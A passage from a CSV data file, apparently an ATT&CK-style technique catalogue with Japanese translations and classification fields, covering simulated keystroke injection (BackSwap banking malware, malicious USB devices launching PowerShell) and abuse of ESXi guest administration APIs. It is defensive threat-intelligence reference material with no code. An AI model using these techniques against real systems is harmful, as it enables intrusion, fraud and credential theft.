USB)",攻撃者は、キーボードショートカットによるコマンドインタプリタ起動、実行用インラインスクリプトの入力、GUIベースアプリケーションへの直接操作など、ユーザーに代わってあらゆる操作を実行するため、被害者コンピュータ上で様々な手段でキーストロークをシミュレートする。これらの操作は攻撃者ツールに事前プログラムされるか、HID（Human Interface Devices）などの物理デバイスを介して実行される。 例えば、攻撃者はWindowsメッセージループを監視し、ユーザーが銀行固有のURLを訪問したタイミングを検知するツールを使用してきた。検知されると、ツールは開発者コンソールを開くかアドレスバーを選択するキーストロークをシミュレートし、クリップボードから悪意のあるJavaScriptを貼り付けて実行する。これにより、取引中の銀行口座番号の置換など、ブラウザ内のコンテンツ操作が可能となる。(引用元: BleepingComputer BackSwap)(引用元: welivesecurity BackSwap)また、悪意のあるUSBデバイスを用いてPowerShell起動用のキーストロークをエミュレートし、攻撃者が制御するサーバーからのマルウェアダウンロード・実行を誘導する事例も確認されている。(引用元: BleepingComputer USB),execution,Windows;macOS;Linux,script_command_execution,foothold,user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--63e3d25c-d57d-407d-8e6a-2cecd71f90be,2025-03-27T18:14:06.330Z,2025-04-15T19:58:36.409Z,,,,
T1675,,ESXi Administration Command,ESXi管理コマンド,"Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs as `vmtoolsd.exe` on Windows guest operating systems, `vmware-tools-daemon` on macOS, and `vmtoolsd ` on Linux.(Citation: Broadcom VMware Tools Services) Adversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs  Efor example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such as `StartProgramInGuest`, `ListProcessesInGuest`, `ListFileInGuest`, and `InitiateFileTransferFromGuest`.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Broadcom Running Guest OS Operations) This may enable follow-on behaviors on the guest VMs, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083), [Data from Local System](https://attack.mitre.org/techniques/T1005), or [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).",攻撃者はESXi管理サービスを悪用し、ESXi仮想環境内でホストされるゲストマシン上でコマンドを実行する可能性があります。ESXiホスト上のVMで常駐するバックグラウンドサービス（VMware Toolsデーモンサービスなど）は、ESXiサーバーからのリモート管理を可能にします。このデーモンサービスは、WindowsゲストOSでは`vmtoolsd.exe`、macOSでは`vmware-tools-daemon`、Linuxでは`vmtoolsd`として動作します。(引用元: Broadcom VMware Tools Services) 攻撃者は様々なツールを活用し、ESXiホスト上のVMでコマンドを実行する可能性があります。例えばvSphere Web Services SDKを使用し、`StartProgramInGuest`、`ListProcessesInGuest`、`ListFileInGuest`、`InitiateFileTransferFromGuest`などのAPIを介してプログラム的にコマンドやスクリプトを実行します。(引用元: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用元: Broadcom Running Guest OS Operations) これにより、ゲスト VM 上で以下の追跡行動が可能となる: [ファイルおよびディレクトリの発見](https://attack.mitre.org/techniques/T1083)、 [ローカルシステムからのデータ取得](https://attack.mitre.org/techniques/T1005)、あるいは[OS認証情報のダンプ](https://attack.mitre.org/techniques/T1003)といった後続の動作を可能にする可能性があります。,execution,ESXi,credential_abuse,foothold,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Unknown,has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--31e5011f-090e-45be-9bb6-17a1c5e8219b,2025-03-28T14:01:52.810Z,2025-04-16T14:57:47.078Z,,,,
